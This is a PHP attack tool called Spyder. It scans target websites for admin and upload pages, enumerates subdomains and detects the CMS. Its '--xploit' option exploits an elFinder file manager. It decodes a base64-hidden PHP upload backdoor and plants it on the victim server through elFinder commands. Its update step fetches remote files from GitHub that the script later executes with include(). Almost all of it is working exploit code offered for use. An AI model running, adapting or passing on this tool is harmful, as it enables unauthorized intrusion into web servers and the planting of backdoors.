#!/usr/bin/env php
<?php
include(__DIR__ . '/vendor/autoload.php');
if(strtolower(substr(PHP_OS, 0, 3)) == 'win') {
    $R  = "";
    $RR = "";
    $G  = "";
    $GG = "";
    $B  = "";
    $BB = "";
    $Y  = "";
    $YY = "";
    $X  = "";
    $ua = "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:53.0) Gecko/20100101 Firefox/53.0";
} else {
    $R  = "\e[91m";
    $RR = "\e[91;7m";
    $G  = "\e[92m";
    $GG = "\e[92;7m";
    $B  = "\e[36m";
    $BB = "\e[36;7m";
    $Y  = "\e[93m";
    $YY = "\e[93;7m";
    $X  = "\e[0m";
    $ua = "Mozilla/5.0 (Linux; Android 5.1.1; Andromax A16C3H Build/LMY47V) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.111 Mobile Safari/537.36";
    system("clear");
}
function update() {
	echo $GG . "[*] Updating [*]" . $X . "\n\n";
        if(!function_exists('file_get_contents')) {
            die($RR . "Function Disabled" . $X . "\n");
        }
        $upload = file_get_contents('https://raw.githubusercontent.com/Cvar1984/Spyder/master/upload');
        $tulis  = fopen('upload', 'w+');
        fwrite($tulis, $upload);
        fclose($tulis);
        echo $GG . "[*] Uploader Wordlist Updated [*]\n\n";
        $admin = file_get_contents('https://raw.githubusercontent.com/Cvar1984/Spyder/master/admin');
        $tulis = fopen('admin', 'w+');
        fwrite($tulis, $admin);
        fclose($tulis);
        echo $GG . "[*] Admin Wordlist Updated [*]" . $X . "\n";
        die();
}

echo $Y."
 ___           __               __ 
/  _/___ _  _ _\ |___  _ __  | /  \ |
\_  \ . \ \/ / . / ._\| `_/ \_\\  //_/
/___/  _/\  /\___\___\|_|    .'/()\`.
    |_\  /_/                 \ \  / /";
echo $R."\n++++++++++++++++++++++++++++++++++++++";
echo $B."\nAuthor  : Cvar1984                   ".$R."+";
echo $B."\nGithub  : https://github.com/Cvar1984".$R."+";
echo $B."\nTeam    : BlackHole Security         ".$R."+";
echo $B."\nVersion : 0.6                        ".$R."+";
echo $B."\nDate    : 31-03-2018                 ".$R."+";
echo $R."\n++++++++++++++++++++++++++++++++++++++".$G."\n\n";
if(!function_exists("curl_init")) {
    die($YY . "[!] cUrl Is Missing, Check /usr/lib/php.ini [!]" . $X . "\n");
}
if(isset($argv[1]) AND isset($argv[2])) {
    if(preg_match("/https:/", $argv[1])) {
        $argv[1] = str_replace("https://", "http://", $argv[1]);
    }
    if($argv[2] == "--upload" OR $argv[2] == "-u") {
        include("upload");
    } elseif($argv[2] == "--admin" OR $argv[2] == "-a") {
        include("admin");
    } elseif($argv[2] == "--update" OR $argv[2] == "-U") {
        echo $GG . "[*] Updating [*]" . $X . "\n\n";
        if(!function_exists('file_get_contents')) {
            die($RR . "Function Disabled" . $X . "\n");
        }
        $upload = file_get_contents('https://raw.githubusercontent.com/Cvar1984/Spyder/master/upload');
        $tulis  = fopen('upload', 'w+');
        fwrite($tulis, $upload);
        fclose($tulis);
        echo $GG . "[*] Uploader Wordlist Updated [*]\n\n";
        $admin = file_get_contents('https://raw.githubusercontent.com/Cvar1984/Spyder/master/admin');
        $tulis = fopen('admin', 'w+');
        fwrite($tulis, $admin);
        fclose($tulis);
        die($GG . "[*] Admin Wordlist Updated [*]" . $X . "\n");
    } elseif($argv[2] == "--domain" OR $argv[2] == "-d") {
    	if(preg_match("/http:/",$argv[1])) {
    		$argv[1]=str_replace("http://","",$argv[1]);
    	} elseif(preg_match("/https:/",$argv[1])) {
    		$argv[1]=str_replace("https://","",$argv[1]);
    	}	
    	$domain=file_get_contents("http://api.hackertarget.com/hostsearch/?q=".$argv[1]);
    	$domain=str_replace(",","\n",$domain);
    	if(!preg_match("/error/",$domain)) {
    	echo $domain;
    	$tulis=fopen("result.txt","a");
    	fwrite($tulis,$domain);
    	fclose($tulis);
    	die($R . "=========================== Cvar1984 ))=====(@)>" . $X . "\n");
    	} else {
    		die($RR."[!] Subdomain Not Found [!]\n".$X);
    	}
    	} elseif($argv[2] == "--cms" OR $argv[2] == "-c") {
    		$cms = new \DetectCMS\DetectCMS($argv[1]);
    if($cms->getResult()) {
       die("Detected CMS  : ".$Y.$cms->getResult().$G."\n");
    } else {
     die($RR."[!] CMS couldn't be detected [!]".$X.$G."\n");
    }
    }	
    elseif($argv[2] == "--xploit" OR $argv[2] == "-e") {
    	if(!preg_match("/php/",$argv[1])) {
    		die($RR."php spyder.php http://example.com/path/php/connector.php".$X."\n");
    	}
    	$nama_doang = "x.php";
    	$isi_nama_doang = "PD9waHAgCmlmKCRfUE9TVCl7CmlmKEBjb3B5KCRfRklMRVNbImYiXVsidG1wX25hbWUiXSwkX0ZJTEVTWyJmIl1bIm5hbWUiXSkpewplY2hvIjxiPmJlcmhhc2lsPC9iPi0tPiIuJF9GSUxFU1siZiJdWyJuYW1lIl07Cn1lbHNlewplY2hvIjxiPmdhZ2FsIjsKfQp9CmVsc2V7CgllY2hvICI8Zm9ybSBtZXRob2Q9cG9zdCBlbmN0eXBlPW11bHRpcGFydC9mb3JtLWRhdGE+PGlucHV0IHR5cGU9ZmlsZSBuYW1lPWY+PGlucHV0IG5hbWU9diB0eXBlPXN1Ym1pdCBpZD12IHZhbHVlPXVwPjxicj4iOwp9Cgo/Pg==";
    	$decode_isi=base64_decode($isi_nama_doang);
    	$encode=base64_encode($nama_doang);
    	$fp=fopen($nama_doang,"w+");
    	fputs($fp, $decode_isi);
    	function ngirim($url, $isi){
    		$ch = curl_init ("$url");
    		curl_setopt ($ch, CURLOPT_RETURNTRANSFER, 1);
    		curl_setopt ($ch, CURLOPT_FOLLOWLOCATION, 1);
    		curl_setopt ($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.1; rv:32.0) Gecko/20100101 Firefox/32.0");
    		curl_setopt ($ch, CURLOPT_SSL_VERIFYPEER, 0);
    		curl_setopt ($ch, CURLOPT_SSL_VERIFYHOST, 0);
    		curl_setopt ($ch, CURLOPT_POST, 1);
    		curl_setopt ($ch, CURLOPT_POSTFIELDS, $isi);
    		curl_setopt($ch, CURLOPT_COOKIEJAR,'coker_log');
    		curl_setopt($ch, CURLOPT_COOKIEFILE,'coker_log');
    		$data3 = curl_exec ($ch);
    		return $data3;
    		}
    		echo $R."[!] Exploiting ".$argv[1]." [!]\n";
    		echo $Y."[!] Uploading 1 [!]\n";
    		$url_mkfile = "$argv[1]?cmd=mkfile&name=$nama_doang&target=l1_Lw";
    		@$b=file_get_contents("$url_mkfile");
    		 $post1 = array(
					"cmd" => "put",
					"target" => "l1_$encode",
					"content" => "$decode_isi",	
					);
					 $post2 = array(
					"current" => "8ea8853cb93f2f9781e0bf6e857015ea",
					"upload[]" => "@$nama_doang",	
					);
	$output_mkfile = ngirim($argv[1], $post1);
	if(preg_match("/$nama_doang/", $output_mkfile)){
	echo $GG."[!] Upload Success 1 => $nama_doang\n# File Uploaded To ../../elfinder/files [!]".$X."\n\n";
	} else {
	echo $RR."[!] Upload Failed 1 [!]".$X."\n";
	}
	echo $Y."[!] Uploading 2 [!]".$X."\n";
	$upload_ah = ngirim($argv[1]."?cmd=upload", $post2);
	if(preg_match("/$nama_doang/", $upload_ah)) {
echo $YY."[!] Upload Success 2 => $nama_doang\n# File Uploaded To ../../elfinder/files [!]".$X."\n\n";							
	} else {
			echo $RR."[!] Upload Failed 2 [!]".$X."\n";
										
	}
    	die();
    } else {
        die($YY . "[!] Parameter False [!]" . $X . "\n");
    }
    $count = count($list);
    echo "String Loaded : " . $Y . $count . $G . "\n";
    foreach($list as $list) {
        $url = $argv[1].$list;
        $ch  = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_USERAGENT, $ua);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
        curl_exec($ch);
        $header = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        $write  = "";
        if(!($header == "404" OR $header == "0")) { //NOR
            $hdr   = "
header : " . $header . "
Url    : " . $url;
            $tulis = fopen("result.txt", "a");
            fwrite($tulis, $hdr);
            fclose($tulis);
            $header = $B . $header . $G;
        } else {
            $header = $R . $header . $G;
        }
        echo "Url    : " . $Y . $url . $G . "\n";
        echo "Header : " . $header . "\n";
    }
    echo $R . "=========================== Cvar1984 ))=====(@)>" . $X . "\n";
} else {
    echo $Y . "--admin,  -a\tSearch Admin Pages\n";
    echo "--upload, -u\tSearch Upload Pages\n";
    echo "--cms,    -c\tCMS Scan\n";
    echo "--domain, -d\tSubdomain Scan\n";
    echo "--xploit, -e\tExploit Elfinder\n";
    echo "--update, -U\tUpdate Wordlist\n\n";
    echo "Example : " . $GG . "php spyder.php http://example.com --admin" . $X . "\n";
}